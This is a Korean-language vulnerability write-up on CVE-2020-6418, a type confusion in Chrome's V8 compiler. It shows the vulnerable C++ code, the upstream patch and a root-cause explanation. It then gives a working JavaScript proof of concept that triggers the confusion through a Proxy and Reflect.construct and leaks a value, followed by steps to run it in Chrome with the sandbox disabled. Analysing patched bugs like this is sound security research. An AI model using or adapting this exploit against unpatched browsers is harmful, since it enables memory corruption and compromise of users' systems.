# Incorrect side effect modelling for JSCreate in V8

## Information
- CVE : CVE-2020-6418
- 해당 소프트웨어 : Chrome V8
- 해당 버전 : Google Chrome prior to 80.0.3987.122
- 취약점 유형 : TypeConfusion

## Root Cause

### original code
```c++
NodeProperties::InferReceiverMapsResult NodeProperties::InferReceiverMapsUnsafe(
  JSHeapBroker* broker, Node* receiver, Node* effect,
  ZoneHandleSet<Map>* maps_return) {
    ...
    InferReceiverMapsResult result = kReliableReceiverMaps;
    while (true) {
      switch (effect->opcode()) {
      ...
        case IrOpcode::kCheckMaps: {
          Node* const object = GetValueInput(effect, 0);
          if (IsSame(receiver, object)) {
            *maps_return = CheckMapsParametersOf(effect->op()).maps();
            return result;
          }
          break;
        }
        case IrOpcode::kJSCreate: {
          if (IsSame(receiver, effect)) {
            base::Optional<MapRef> initial_map = GetJSCreateMap(broker, receiver);
            if (initial_map.has_value()) {
              *maps_return = ZoneHandleSet<Map>(initial_map->object());
              return result;
            }
            // We reached the allocation of the {receiver}.
            return kNoReceiverMaps;
          }
          break;
        }
      ...  
      }
      // Stop walking the effect chain once we hit the definition of
      // the {receiver} along the {effect}s.
      if (IsSame(receiver, effect)) return kNoReceiverMaps;
      
      // Continue with the next {effect}.
      effect = NodeProperties::GetEffectInput(effect);
    }
}
```
### patched code
```patch
diff --git a/src/compiler/node-properties.cc b/src/compiler/node-properties.cc
index f43a348..ab4ced6 100644
--- a/src/compiler/node-properties.cc
+++ b/src/compiler/node-properties.cc
@@ -386,6 +386,7 @@
           // We reached the allocation of the {receiver}.
           return kNoReceiverMaps;
         }
+        result = kUnreliableReceiverMaps;  // JSCreate can have side-effect.
         break;
       }
       case IrOpcode::kJSCreatePromise: {
```


NodeProperties::InferReceiverMapUnsafe 함수는 컴파일된 함수의 effect chain 역으로 탐색하며 객체가 가질 수 있는 Map을 추론한다. 예를 들어 effect chain에서 CheckMaps 노드를 탐색할 경우 컴파일러에서 해당 객체가 CheckMaps 노드가 원하는 map을 가질 것이라 추론한다. 취약점이 발생하는 JSCreate 노드에서는 JSCreate에서 리시버를 생성할 경우 컴파일러에서 초기 객체의 Map을 해당 리시버의 Map으로 추론한다. 하지만 JSCreate가 리시버와 다른 종류의 객체를 취급할 경우 컴파일러는 리시버의 map이 변경되지 않을 것이라 가정한다. 취약점은 이 부분에서 발생한다. JSCreate가 새로운 타겟의 prototype에 접근할때 Proxy 객체가 이를 가로채 임의의 javascript 코드 실행이 가능해진다.

## PoC
```javascript
const MAX_ITERATIONS = 100000;
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(8);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    let tmp = Array.from(u32);
    return tmp[1] * 0x100000000 + tmp[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

let a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

function empty() {}

function f(p) {
  return a.pop(Reflect.construct(empty, arguments, p));
}

let p = new Proxy(Object, {
    get: () => {
        //%DebugPrint(a);
        //%SystemBreak();
        a[0] = {};
        //%DebugPrint(a);
        //%SystemBreak();
        return Object.prototype;
    }
});

function main(p) {
  return f(p);
}

%PrepareFunctionForOptimization(empty);
%PrepareFunctionForOptimization(f);
%PrepareFunctionForOptimization(main);

main(empty);
main(empty);
%OptimizeFunctionOnNextCall(main);
print(hex(f2i(main(p))));
```

## How to run exploit?
> OS : Ubuntu 18.04 64bit
> 
> Chrome version : Google Chrome prior to 80.0.3987.122
1) --no-sandbox 옵션으로 크롬 실행
2) exp.js 파일을 로드

## Reference
- [Chrome Bug Tracker](https://bugs.chromium.org/p/chromium/issues/detail?id=1053604)
- [ray-cp github](https://github.com/ray-cp/browser_pwn/tree/master/cve-2020-6418)
- [ray-cp blog](https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)
- [exodus intel blog](https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/)
- [V8 patch code](https://chromium.googlesource.com/v8/v8/+/fb0a60e15695466621cf65932f9152935d859447)